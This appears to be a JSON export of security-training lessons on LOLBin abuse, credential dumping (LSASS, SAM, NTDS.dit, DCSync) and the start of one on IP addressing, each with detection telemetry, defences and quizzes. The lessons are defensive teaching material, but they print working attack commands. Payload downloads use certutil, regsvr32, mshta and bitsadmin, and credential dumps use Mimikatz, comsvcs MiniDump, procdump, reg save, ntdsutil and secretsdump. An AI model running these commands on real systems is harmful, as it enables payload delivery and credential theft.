**LOLBin** (Living Off the Land Binary) is a legitimate, Microsoft-signed, already-installed Windows program that an attacker repurposes to do something malicious — download a payload, run code, or hide from application-control rules. Because the binary is signed and already present, it sails past exactly the kind of defence (blocklists, 'is this a known file?') that stops ordinary malware. MITRE ATT&CK — the industry's shared catalogue of attacker techniques — tracks this broad idea mainly under technique **T1218 (System Binary Proxy Execution)**. By the end of this lesson you will recognise the handful of binaries attackers reach for most, know exactly which Sysmon and Windows events reveal their abuse, and understand why the defence has to shift from 'block the file' to 'watch how it is used'."
    },
    {
      "heading": "What LOLBins Are and Why They Work",
      "content": "Now that the core idea is clear, here is the precise picture. LOLBins are abused for actions such as downloading payloads, executing code, or bypassing application control — and the broader tradecraft is tracked by MITRE ATT&CK primarily under T1218 (System Binary Proxy Execution) and related techniques.\n\nWhy is this so effective?\n\n- **Signed and trusted**: these binaries carry valid Microsoft signatures. Security controls that trust signed Microsoft code, or that block 'unknown' executables, wave them through.\n- **Already present**: nothing new is dropped to disk, so file-reputation and 'first seen' detections have nothing to flag. This supports fileless attacks.\n- **Blocklists fail**: you cannot simply block rundll32.exe — Windows itself and countless legitimate applications depend on it. The binary is simultaneously essential and dangerous.\n- **Blends with normal activity**: administrators use many of these same tools daily, so malicious use hides in a sea of legitimate use.\n\nThe key mental shift for an analyst: with LOLBins you cannot detect on the **presence** of the binary, only on **how it is used** — the command-line arguments, the parent process that launched it, and the network or file behaviour that follows. Detection moves from 'what ran' to 'what it was told to do, by what, and why'.\n\nThe community-maintained **LOLBAS Project** (Living Off The Land Binaries, Scripts and Libraries) catalogues these binaries, the exact functions they can be abused for (Execute, Download, AWL bypass), and example command lines — an essential reference for both detection engineering and threat hunting."
    },
    {
      "heading": "The Most-Abused Windows LOLBins",
      "content": "An analyst should recognise these binaries and their abuse patterns on sight:\n\n| Binary | Legitimate purpose | Abuse |\n|--------|--------------------|-------|\n| **rundll32.exe** | Run functions exported by DLLs | Execute malicious DLLs/JS; proxy execution (T1218.011) |\n| **regsvr32.exe** | Register/unregister COM DLLs | 'Squiblydoo' — run remote scriptlet, AWL bypass (T1218.010) |\n| **mshta.exe** | Run HTML Applications (.hta) | Execute remote HTA/JScript/VBScript (T1218.005) |\n| **certutil.exe** | Certificate management | Download files from URLs; decode base64 payloads (T1105) |\n| **bitsadmin.exe** | Manage BITS transfers | Download payloads; create persistence jobs (T1197) |\n| **wmic.exe** | WMI command line | Remote execution, recon, XSL script execution (T1047) |\n| **msbuild.exe** | Build .NET projects | Compile and run inline C# from a crafted project file (T1127.001) |\n| **installutil.exe** | Install .NET assemblies | Execute code via installer/uninstaller methods, AWL bypass (T1218.004) |\n\n### Worked examples\n\ncertutil used as a downloader:\n\n```\ncertutil.exe -urlcache -split -f http://198.51.100.20/payload.exe payload.exe\n```\n\nregsvr32 running a remote scriptlet — the 'Squiblydoo' technique, executing code while bypassing application whitelisting:\n\n```\nregsvr32 /s /n /u /i:http://198.51.100.20/file.sct scrobj.dll\n```\n\nmshta fetching and executing a remote HTML application:\n\n```\nmshta http://198.51.100.20/invoice.hta\n```\n\nbitsadmin quietly downloading a second-stage payload via the Background Intelligent Transfer Service:\n\n```\nbitsadmin /transfer msUpdateJob /download /priority high http://198.51.100.20/payload.exe C:\\Users\\Public\\payload.exe\n```\n\nEach of these is technically executed by a trusted Microsoft binary, so the process tree shows a signed system tool as the actor, not a custom attacker tool. That single fact is why the next section — what these commands look like in telemetry — matters so much."
    },
    {
      "heading": "How LOLBin Abuse Appears in EDR/Sysmon Telemetry",
      "content": "Two data sources give an analyst visibility into LOLBin abuse, and both hinge on capturing command-line arguments — without them, all you see is a familiar filename with nothing suspicious about it.\n\n### Sysmon Event ID 1 — Process Create\n\nSysmon's **Event ID 1** fires whenever any process starts, and its most valuable fields are **Image** (the executable that ran), **CommandLine** (the full arguments), **ParentImage** (what launched it), **ParentCommandLine**, and **User**. A phishing document spawning mshta would look like this:\n\n```\nUtcTime: 2026-03-11 14:02:17\nImage: C:\\Windows\\System32\\mshta.exe\nCommandLine: mshta.exe http://198.51.100.20/invoice.hta\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nParentCommandLine: WINWORD.EXE /n C:\\Users\\d.levi\\Downloads\\Invoice_4471.docm\nUser: CORP\\d.levi\n```\n\nTwo seconds later, mshta spawns certutil to fetch the real payload:\n\n```\nUtcTime: 2026-03-11 14:02:19\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -split -f http://198.51.100.20/upd.exe upd.exe\nParentImage: C:\\Windows\\System32\\mshta.exe\nUser: CORP\\d.levi\n```\n\nRead as a story: a Word document a user opened launched mshta, which launched certutil with a download argument — a phishing-to-execution chain, entirely built from signed Microsoft binaries.\n\n### Sysmon Event ID 3 — Network Connection\n\nCorrelating with **Event ID 3** shows certutil then reaching out to the internet — abnormal for a certificate-management tool in everyday use:\n\n```\nUtcTime: 2026-03-11 14:02:19\nImage: C:\\Windows\\System32\\certutil.exe\nDestinationIp: 198.51.100.20\nDestinationPort: 80\nProtocol: tcp\n```\n\n### Windows Event ID 4688 — the native alternative\n\nWindows' own **Security Event ID 4688** (process creation) can carry the same **CommandLine** and **ParentProcessName** fields as Sysmon — but only if the Group Policy setting 'include command line in process creation events' has been turned on. Without it, 4688 shows only the process name with the arguments blank, which is effectively useless for LOLBin detection. Sysmon captures command lines without any extra policy, which is the main reason most SOCs deploy it even when native Windows auditing is already enabled."
    },
    {
      "heading": "Detecting LOLBin Abuse",
      "content": "Because you cannot block these binaries, detection focuses on **anomalous usage**, built from the telemetry in the previous section.\n\nHigh-value detection signals:\n\n- **Unusual command-line arguments**: certutil with -urlcache or -decode; regsvr32 with /i:http; mshta or rundll32 referencing a URL or a javascript:/vbscript: protocol; msbuild running a project file from a temp or user directory. These argument patterns rarely appear in legitimate use.\n- **Unexpected parent-child relationships**: Office applications (winword.exe, excel.exe, outlook.exe) spawning mshta, rundll32, wscript, powershell, or certutil is a textbook phishing-to-execution chain, as shown above. A LOLBin whose parent is a document handler is far more suspicious than the same binary launched by a system process.\n- **LOLBins making network connections**: certutil.exe, bitsadmin.exe, mshta.exe, or regsvr32.exe connecting to an external IP is abnormal — these tools rarely reach the internet in normal desktop use. msbuild.exe or installutil.exe making outbound connections is almost never legitimate.\n- **Execution from unusual locations** or with obfuscated/encoded arguments.\n\nA robust approach is to build detections directly from the **LOLBAS** command-line examples and hunt for those patterns, then tune out the legitimate administrative baseline in your environment. Correlation beats single events: outlook.exe leading to mshta.exe leading to a certutil download leading to a new external connection tells a clear story even though each binary is individually trusted."
    },
    {
      "heading": "Defending Against Living Off the Land",
      "content": "Since removal is not an option, defence combines application control, telemetry, and least privilege.\n\n**Application control (the strongest lever)**:\n\n- **Windows Defender Application Control (WDAC)** and **AppLocker** can restrict *how* these binaries run, not just whether they exist. Microsoft publishes a **recommended block-rules list** specifically to neutralise commonly abused LOLBins (including many listed here) in WDAC policies. Enforcing these blocks the known bypass paths while preserving legitimate system operation.\n- **Attack Surface Reduction (ASR) rules** in Microsoft Defender directly target several LOTL patterns — for example, blocking Office applications from creating child processes and blocking executable content from email and script interpreters.\n\n**Telemetry and monitoring**:\n\n- Ensure command-line logging is enabled everywhere (Sysmon EID 1 / 4688 with the command-line GPO) — without arguments, LOLBin detection is nearly impossible.\n- Deploy detections modelled on LOLBAS examples and alert on the parent-child and network anomalies above.\n- Monitor for script-interpreter and proxy-execution binaries reaching the internet.\n\n**Least privilege and hardening**:\n\n- Remove local administrator rights where possible; many LOLBin techniques are far more damaging with elevated privileges.\n- Disable or constrain features attackers lean on (e.g., legacy script hosts, macros from the internet).\n\n**Threat hunting**: proactively sweep for the classic command lines (certutil -urlcache, Squiblydoo, mshta http) across your fleet. Because legitimate admins occasionally use these tools, expect to triage with context — who ran it, on which host, launched by what parent, and what happened next. The goal is not to eliminate the binaries but to make their malicious use noisy and visible."
    }
  ],
  "keyTakeaways": [
    "LOLBins are signed, built-in Windows binaries (rundll32, regsvr32, mshta, certutil, bitsadmin, wmic, msbuild, installutil) abused for proxy execution and downloads (T1218 and related techniques); because they are trusted and essential you cannot blocklist them, so detection must focus on how they are used, not their presence.",
    "Sysmon Event ID 1 (Image/CommandLine/ParentImage/ParentCommandLine) and Event ID 3 (Network Connection) are the core telemetry for catching LOLBin abuse; Windows Event 4688 only captures CommandLine if the 'include command line' Group Policy is enabled, which is why most SOCs still deploy Sysmon.",
    "Detect LOLBin abuse through anomalous parent-child chains (Office spawning these tools), LOLBins making unexpected network connections, and command-line patterns lifted from the LOLBAS project; defend with WDAC/AppLocker using Microsoft's recommended block rules, ASR rules, and least privilege."
  ],
  "quiz": [
    {
      "question": "During triage you see outlook.exe spawn mshta.exe, which then launches certutil.exe running with a -urlcache argument pointed at an external URL. Why is blocking certutil.exe by name a poor primary defence here?",
      "options": [
        {
          "label": "Certutil is malware that Microsoft accidentally ships, so blocking it by name fully resolves the threat.",
          "value": "a"
        },
        {
          "label": "Certutil is a legitimate signed system tool relied on by Windows, so detection must target its abusive usage instead.",
          "value": "b"
        },
        {
          "label": "Certutil cannot make network connections at all, so the observed download must be a false positive.",
          "value": "c"
        },
        {
          "label": "Blocking by name is impossible in Windows because binaries have no filenames the system can read.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Certutil is a legitimate, signed, system-relied-upon binary, so you cannot simply block it; you detect on abusive usage like -urlcache downloads and suspicious parent chains (b). Option (a) is false — certutil is a genuine certificate tool, not malware. Option (c) is wrong: certutil can and here does make outbound connections, which is exactly the abuse. Option (d) is technically incorrect; application control can absolutely target filenames, but doing so here would break legitimate functionality."
    },
    {
      "question": "Your organization wants to reduce LOLBin abuse without breaking legitimate Windows operations. Which approach best fits that goal?",
      "options": [
        {
          "label": "Uninstall rundll32, regsvr32, and certutil from every endpoint to remove the binaries entirely.",
          "value": "a"
        },
        {
          "label": "Disable all command-line logging to cut noise, then rely only on file-hash blocklists for detection.",
          "value": "b"
        },
        {
          "label": "Deploy WDAC/AppLocker with Microsoft's recommended block rules plus ASR rules and command-line logging.",
          "value": "c"
        },
        {
          "label": "Trust every Microsoft-signed binary automatically and stop monitoring their process activity for anomalies.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "WDAC/AppLocker with Microsoft's recommended block rules restricts how abused binaries run, ASR blocks common LOTL chains, and command-line logging enables detection — all without removing essential tools (c). Option (a) would break Windows, since these binaries are core dependencies. Option (b) is counterproductive: command-line logging is the key enabler for LOLBin detection, and file hashes do not help against trusted binaries. Option (d) is precisely the flawed trust assumption LOLBins exploit."
    },
    {
      "question": "An analyst checks Windows Security Event ID 4688 for the command-line arguments used to launch mshta.exe, but the CommandLine field is empty even though the process name is recorded. What is the most likely cause and the correct fix?",
      "options": [
        {
          "label": "4688 can never record command-line arguments under any configuration, so Sysmon must be deployed instead.",
          "value": "a"
        },
        {
          "label": "The 'include command line in process creation events' Group Policy setting has not been enabled, so it must be turned on for 4688 to capture arguments.",
          "value": "b"
        },
        {
          "label": "mshta.exe deletes its own command line from the event log after execution, so no Windows setting can recover it.",
          "value": "c"
        },
        {
          "label": "CommandLine only appears in Sysmon Event ID 3 network events, so the analyst should check network connections instead.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Windows Security Event ID 4688 only populates the CommandLine field when the 'include command line in process creation events' Group Policy setting is enabled; without it the field stays blank even though process creation is still logged (b). Option (a) is wrong because 4688 can capture command lines once that policy is turned on. Option (c) invents a self-deleting log behaviour that does not exist. Option (d) confuses Sysmon Event ID 3 (network connections) with process creation, where command-line data actually lives (Sysmon Event ID 1, or a properly configured 4688)."
    }
  ],
  "references": [
    "https://lolbas-project.github.io/",
    "https://attack.mitre.org/techniques/T1218/",
    "https://attack.mitre.org/techniques/T1105/",
    "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-block-rules"
  ],
  "xp": 260,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-credential-dumping-lsass-sam-ntds",
  "slug": "credential-dumping-lsass-sam-ntds",
  "title": "Credential Dumping: LSASS, SAM, and NTDS.dit",
  "topic": "Credential Access",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "After gaining a foothold, attackers hunt for credentials to move laterally and escalate — a technique family MITRE ATT&CK calls OS Credential Dumping (T1003). This lesson assumes no prior background: it defines what a hash actually is and why stealing one is often enough to authenticate, covers where Windows stores credentials, how each store (LSASS memory, the SAM, and the domain NTDS.dit) is dumped in practice with real attacker commands, and the specific Sysmon and Windows event telemetry a SOC analyst uses to detect it.",
  "sections": [
    {
      "heading": "Start Here: What a Hash Is and Why Attackers Dump Credentials",
      "content": "Before diving into LSASS, SAM, and NTDS.dit, two ideas from cryptography need to be solid, because everything an attacker does in this lesson is really just 'get the hash, then reuse the hash'.\n\n### What is a hash, in plain terms?\n\nA **hash** is the output of a one-way mathematical function: you feed in data (like a password), and it spits out a fixed-length scrambled string that looks nothing like the original — and, crucially, you cannot run the function backwards to recover the original password from the hash. Windows never stores your actual typed password; it stores a hash of it, and checks a login by hashing what you typed and comparing the two hashes.\n\nHere is the twist that makes credential dumping so dangerous: for several Windows authentication protocols (most notably **NTLM**), a valid hash is enough to authenticate — you do not need to ever know or crack the original password. This is called **Pass-the-Hash**. So when an attacker steals a hash, they have effectively stolen a working credential, even if they never learn what the human-readable password actually is.\n\n### What is process memory, and why LSASS matters\n\nEvery running program uses a chunk of RAM called its **process memory** to hold whatever it is currently working with. When you log in to Windows, a special process called **LSASS** briefly needs your real credentials in a usable form (to check them, and to support features like single sign-on), and it keeps some of that material cached in its own process memory for as long as you are logged in. That cached material is the single richest prize on any live Windows machine — which is why 'dump LSASS' is one of the very first things attacker toolkits attempt after gaining a foothold.\n\n### The three treasure chests, previewed\n\nWindows keeps credential material in three places, and this lesson covers all three in turn: **LSASS memory** (live sessions, on any machine), the **SAM database** (local account hashes, on any machine), and **NTDS.dit** (every domain account's hash, but only on a Domain Controller). MITRE ATT&CK groups all of this under **T1003 — OS Credential Dumping**. Understanding this technique family is the difference between 'the attacker has one compromised laptop' and 'the attacker can log in as anyone, anywhere in the network' — it is usually the single most consequential step in an intrusion, which is exactly why detecting it fast matters so much."
    },
    {
      "heading": "Where Windows Credentials Live",
      "content": "With hashes and process memory defined, here is the map of exactly where Windows keeps credential material — three principal places, each corresponding to a MITRE sub-technique:\n\n- **LSASS memory (T1003.001)**: the Local Security Authority Subsystem Service (lsass.exe) handles authentication and caches credential material for logged-on users — NTLM hashes, and depending on configuration, Kerberos tickets and sometimes cleartext passwords. Because live sessions are in memory, LSASS is the single richest target on a running host.\n- **SAM database (T1003.002)**: the Security Account Manager stores local account password hashes on each Windows machine. It lives in the registry hive HKLM\\SAM, backed by the file C:\\Windows\\System32\\config\\SAM. Dumping it yields local account hashes (including the local Administrator), useful for lateral movement where passwords are reused.\n- **NTDS.dit (T1003.003)**: on a Domain Controller, the Active Directory database C:\\Windows\\NTDS\\NTDS.dit contains the password hashes of every domain account. Compromising it is catastrophic — it is effectively the keys to the entire domain.\n\nA fourth, related technique — **DCSync (T1003.006)** — does not touch these files directly. Instead an attacker with sufficient rights (typically domain admin or delegated replication rights) abuses the directory replication protocol (DRSUAPI) to ask a Domain Controller to hand over account hashes, as if it were another Domain Controller. No malware on the DC, no file access — just a rogue replication request, which is why it is stealthy and dangerous.\n\nThis map tells the analyst which host to look at (any host for LSASS/SAM, a Domain Controller for NTDS/DCSync) and which telemetry matters for each — covered section by section below."
    },
    {
      "heading": "How LSASS Memory Is Dumped",
      "content": "LSASS is the most frequently attacked credential store because it holds live session secrets. The classic tool is **Mimikatz**, but attackers increasingly use built-in and less obvious methods to avoid dropping known tools.\n\nMimikatz reading LSASS memory directly:\n\n```\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n```\n\nThis extracts hashes, tickets, and — with legacy WDigest configurations — plaintext passwords for every logged-on user.\n\n**comsvcs.dll MiniDump** — a living-off-the-land technique using a signed Microsoft DLL, dumping LSASS memory to a file for offline parsing, so no custom tool ever touches the host:\n\n```\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1332 C:\\Windows\\Temp\\lsass.dmp full\n```\n\n(1332 here is the LSASS process ID, found first with a tool like tasklist.)\n\nprocdump achieving the same result with a legitimate Sysinternals utility:\n\n```\nprocdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp\n```\n\nWhatever the tool, the unavoidable common denominator is that some process must open a handle to lsass.exe with memory-read rights. That handle-open is the golden detection opportunity, covered in detail in the telemetry section below. Attackers try to reduce visibility by dumping memory to disk and parsing it on another machine, or by using signed binaries (comsvcs.dll) so the actor in the process tree is rundll32.exe rather than mimikatz.exe. The defender's advantage is that legitimate software almost never reads LSASS memory — so nearly any non-security process opening lsass with read access is inherently suspicious."
    },
    {
      "heading": "How SAM and NTDS.dit Are Dumped",
      "content": "**Dumping the SAM (T1003.002)**: the SAM hive is locked while Windows runs, so attackers copy it rather than open it directly.\n\nSaving the registry hives — the SYSTEM hive is required too, because it holds the boot key that decrypts SAM hashes:\n\n```\nreg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hive\nreg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive\n```\n\nOr via a Volume Shadow Copy, bypassing the file lock entirely by snapshotting the volume and copying the hive out of the snapshot:\n\n```\nvssadmin create shadow /for=C:\ncopy E:\\Windows\\System32\\config\\SAM C:\\Windows\\Temp\\sam.hive\n```\n\n(E: here represents the shadow copy exposed as a drive, typically via a symlink or a shadow-copy browsing tool.)\n\nTools like **secretsdump.py** (Impacket) automate this against a remote host over the network:\n\n```\nsecretsdump.py CORP/svc-backup:Passw0rd1@10.14.22.5\n```\n\n**Dumping NTDS.dit (T1003.003)** on a Domain Controller — the whole-domain prize:\n\nntdsutil uses the legitimate 'Install From Media' feature to copy NTDS.dit and the SYSTEM hive out cleanly:\n\n```\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntdsdump\" q q\n```\n\nOr, again, a Volume Shadow Copy of the Domain Controller's system drive, then copying NTDS.dit and the SYSTEM hive out of the snapshot — the most common approach, since NTDS.dit is locked while Active Directory is running. secretsdump.py can also target a Domain Controller directly, or an attacker can skip files entirely and use **DCSync (T1003.006)** to pull hashes via replication.\n\nThe recurring theme: because the sensitive files are locked, attackers lean on shadow copies, built-in admin utilities (ntdsutil, reg, vssadmin), and replication. That makes those specific tools and actions — shadow-copy creation on a Domain Controller, ntdsutil execution, reg save of registry hives — high-fidelity indicators, since they are rare in normal operations."
    },
    {
      "heading": "Detecting Credential Dumping in Telemetry",
      "content": "**LSASS access — the highest-value signal.** Sysmon **Event ID 10 (ProcessAccess)** fires whenever one process opens a handle to another, and it is the single best place to catch credential dumping in the act. Its key fields are **SourceImage** (who opened the handle), **TargetImage** (what was accessed), and **GrantedAccess** (exactly which rights were granted):\n\n```\nUtcTime: 2026-03-11 09:41:03\nSourceImage: C:\\Windows\\System32\\rundll32.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1410\nSourceUser: CORP\\d.levi\n```\n\n**GrantedAccess 0x1410** decodes to three combined rights: 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) plus 0x0400 (PROCESS_QUERY_INFORMATION) plus 0x0010 (PROCESS_VM_READ) — and that last one, VM_READ, is what actually lets the source process read LSASS's memory contents. Masks like 0x1010, 0x1410, and 0x1438 are the classic signatures of Mimikatz-style dumping; alert whenever the SourceImage is not a known security product.\n\nCorrelating with **Event ID 1** shows the comsvcs technique in the same window:\n\n```\nUtcTime: 2026-03-11 09:41:02\nImage: C:\\Windows\\System32\\rundll32.exe\nCommandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1332 C:\\Windows\\Temp\\lsass.dmp full\nParentImage: C:\\Windows\\System32\\cmd.exe\n```\n\n**SAM/NTDS theft** shows up in ordinary process creation logs — reg.exe saving a registry hive is rare enough on its own to be a strong indicator:\n\n```\nEventID: 4688\nNewProcessName: C:\\Windows\\System32\\reg.exe\nCommandLine: reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hive\nParentProcessName: C:\\Windows\\System32\\cmd.exe\nSubjectUserName: svc-backup\n```\n\nAlso watch for shadow-copy creation (vssadmin or wmic shadowcopy, Windows Event ID 8222), ntdsutil.exe execution with ifm/create full, and file-creation events for new .dmp or hive files.\n\n**DCSync** shows up on a Domain Controller as Windows Security **Event ID 4662**, an object-access event carrying the replication control-access-right GUID:\n\n```\nEventID: 4662\nSubjectUserName: j.intern\nObjectType: DS-Replication-Get-Changes-All\nAccessMask: 0x100\n```\n\nThe moment this replication right appears from an account that is not itself a Domain Controller, treat it as DCSync — normal domain replication only ever originates from a Domain Controller's own machine account."
    },
    {
      "heading": "Defence",
      "content": "**Windows Defender Credential Guard** isolates LSASS secrets in a virtualization-based secure enclave so even admin-level malware cannot read them from memory — this is the single strongest technical control against LSASS dumping.\n\n**LSASS as Protected Process Light (RunAsPPL)** blocks unauthorized handle-opens to lsass.exe, stopping most dumping tools before they can even request the access rights seen in the telemetry above.\n\n**Least privilege**: remove unnecessary local admin rights and tightly control domain admin membership; most dumping techniques require some form of elevation first.\n\n**Protect Domain Controllers**: restrict interactive logon, monitor for shadow copies and ntdsutil execution, and audit which accounts hold replication rights so DCSync-capable permissions are minimized and any use is alerted on.\n\n**Harden defaults**: disable WDigest cleartext caching (off by default on modern Windows, but worth verifying), and enable the Attack Surface Reduction rule 'Block credential stealing from the Windows local security authority subsystem', which directly blocks the LSASS-access techniques covered in this lesson.\n\nCombined, these controls attack every stage covered above: Credential Guard and PPL remove the target even if an attacker gets a foothold, least privilege limits who can even attempt it, and Domain Controller hardening plus replication auditing closes the SAM/NTDS/DCSync paths — leaving only noisy, alertable attempts rather than silent success."
    }
  ],
  "keyTakeaways": [
    "A hash is a one-way scrambled representation of a password, and because NTLM Pass-the-Hash accepts a valid hash without ever knowing the plaintext, stealing a hash is functionally stealing a credential — which is why OS Credential Dumping (T1003), targeting LSASS memory (.001), the SAM (.002), NTDS.dit (.003), and DCSync (.006), is usually the pivotal step of an intrusion.",
    "LSASS is dumped via Mimikatz, the signed comsvcs.dll MiniDump technique, or procdump; SAM and NTDS.dit are locked while Windows runs, so attackers copy them via reg save, a Volume Shadow Copy, or ntdsutil, or skip files entirely with DCSync's replication abuse.",
    "Detection centers on Sysmon Event ID 10 ProcessAccess to lsass.exe with credential-read GrantedAccess masks (0x1010/0x1410/0x1438) from a non-security process, reg save / vssadmin / ntdsutil process creation, and Event ID 4662 replication requests from non-DC accounts (DCSync) — defended by Credential Guard, LSASS PPL, least privilege, and Domain Controller hardening."
  ],
  "quiz": [
    {
      "question": "On a workstation, Sysmon Event ID 10 shows a non-security process opening a handle to lsass.exe with GrantedAccess 0x1410, and Event ID 1 shows rundll32.exe calling comsvcs.dll MiniDump against the LSASS PID. What is happening?",
      "options": [
        {
          "label": "Routine antivirus scanning of memory, which always opens lsass with these exact access rights during updates.",
          "value": "a"
        },
        {
          "label": "An attacker is dumping LSASS memory to steal credentials using a signed living-off-the-land technique.",
          "value": "b"
        },
        {
          "label": "Windows is rebooting lsass.exe on a schedule, and the handle access is a benign side effect of restart.",
          "value": "c"
        },
        {
          "label": "A printer driver is loading into lsass, which is normal and requires memory-read access to function.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A non-security process reading LSASS memory (GrantedAccess 0x1410) combined with rundll32 invoking comsvcs.dll MiniDump is textbook LSASS credential dumping via a signed LOLBin (T1003.001) (b). Option (a) is wrong — legitimate AV is a known security process and would not appear as an anomalous non-security source. Option (c) is fabricated; LSASS is not restarted on a schedule. Option (d) is false — printer drivers do not load into or read LSASS memory."
    },
    {
      "question": "On a Domain Controller, Windows Security Event ID 4662 shows a replication (DS-Replication-Get-Changes) request coming from a regular user account that is not a domain controller. Which technique should you suspect?",
      "options": [
        {
          "label": "Normal Active Directory replication, since all user accounts routinely replicate directory changes between sites.",
          "value": "a"
        },
        {
          "label": "A DCSync attack abusing replication rights to pull domain password hashes without touching NTDS.dit.",
          "value": "b"
        },
        {
          "label": "A harmless group policy refresh, which always generates replication requests from standard user accounts.",
          "value": "c"
        },
        {
          "label": "A failed logon attempt, since Event ID 4662 specifically records incorrect passwords on the controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Replication requests should come only from domain controllers; a normal user account requesting DS-Replication-Get-Changes is DCSync (T1003.006), pulling hashes via the replication protocol (b). Option (a) is false — ordinary user accounts do not perform directory replication. Option (c) is wrong; GPO refresh does not trigger replication-get-changes from user accounts. Option (d) misidentifies the event: 4662 logs object-access/operations, not failed-password logons (which are 4625)."
    },
    {
      "question": "Sysmon Event ID 10 shows GrantedAccess 0x1410 for a handle a non-security process opened against lsass.exe. Which rights combine to make up that mask, and why do they matter for credential dumping?",
      "options": [
        {
          "label": "PROCESS_CREATE_THREAD and PROCESS_TERMINATE, which let the source process kill and restart lsass.exe at will.",
          "value": "a"
        },
        {
          "label": "PROCESS_QUERY_INFORMATION and PROCESS_VM_READ, which let the source process read the actual memory contents of lsass.exe — exactly what is needed to extract cached credentials.",
          "value": "b"
        },
        {
          "label": "PROCESS_QUERY_INFORMATION and PROCESS_ALL_ACCESS, which grant the source process full administrative control over the domain controller.",
          "value": "c"
        },
        {
          "label": "PROCESS_SUSPEND_RESUME and PROCESS_VM_WRITE, which let the source process pause lsass.exe and write new code into it.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "0x1410 breaks down to PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_QUERY_INFORMATION, and PROCESS_VM_READ; the VM_READ right is what actually allows reading LSASS's memory contents, which is exactly what is needed to pull cached credential material — the core mechanic behind every LSASS dumping technique in this lesson (b). Options (a), (c), and (d) each invent access rights not present in that mask and describe unrelated capabilities (killing processes, domain-wide administrative control, or code injection) that 0x1410 does not grant."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1003/",
    "https://attack.mitre.org/techniques/T1003/002/",
    "https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/",
    "https://attack.mitre.org/techniques/T1003/006/"
  ],
  "xp": 260,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-ip-addressing-subnets-nat",
  "slug": "ip-addressing-subnets-nat",
  "title": "IP Addressing, Subnets, and NAT",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every investigation you run as a SOC analyst starts with an IP address: who talked to whom, from where, and whether that connection should have happened at all. This lesson assumes zero prior networking knowledge. We build up from the very basics — what a number even means as an 'address', why computers need 32-bit values instead of names, how those bits are carved into networks and hosts, how a whole company's worth of laptops can share one public IP through NAT, and how IPv6 changes the picture. Every term is defined the first time it appears, with worked examples you can follow with pen and paper. By the end, a firewall log line will read like a sentence instead of noise, and you will know exactly what attackers try to abuse in this layer of the stack.",
  "sections": [
    {
      "heading": "From Zero: What Is an IP Address, and Why Does It Exist?",
      "content": "### The postal address analogy\n\nEvery house needs an address so mail can find it: a street, a number, a city. A computer network has the exact same problem — millions of devices, and every message sent across the network needs to know exactly which device to reach. An **IP address (Internet Protocol address)** is that address for a device. Just like a postal address has a country, city, street, and house number, an IP address has a **network portion** (which neighborhood) and a **host portion** (which house on that street) — we will unpack that split in the next few sections.\n\n### Why numbers, not names\n\nHumans like names (`www.example.com`); network hardware — routers and switches — moves traffic using numbers, because comparing and routing fixed-length numbers is fast and simple for a machine to do billions of times a second. (The system that turns names into these numbers, DNS, is covered in its own lesson.) The number used today, almost everywhere, is called **IPv4**, and it is a **32-bit** number, meaning it is built from 32 binary digits (ones and zeros).\n\n### From bits to the address you actually see\n\nWriting out 32 binary digits by hand is unreadable for humans, so IPv4 addresses are split into four 8-bit chunks called **octets**, and each octet is written as its decimal (0-255) equivalent, separated by dots. That is where the familiar `192.168.1.20` format — **dotted-decimal notation** — comes from.\n\n```\nBinary (32 bits, four 8-bit octets):\n11000000.10101000.00000001.00010100\n\nDecimal (dotted-decimal notation):\n   192   .  168   .   1   .   20\n```\n\nEach octet's 8 bits can represent 0 to 255 (since 2^8 = 256 possible values, starting from 0), which is why you never see a number above 255 in an IP address, and why four octets give roughly 4.3 billion possible addresses total (256^4). Every device that speaks IP — laptops, phones, servers, firewalls, printers — needs one of these addresses to send or receive anything. Keep that binary picture in mind; it is exactly what makes subnetting, covered soon, make sense, because subnetting is just deciding, in that string of 32 bits, where the 'network' part ends and the 'host' part begins."
    },
    {
      "heading": "Public vs Private Addresses: The First Classification You Always Make",
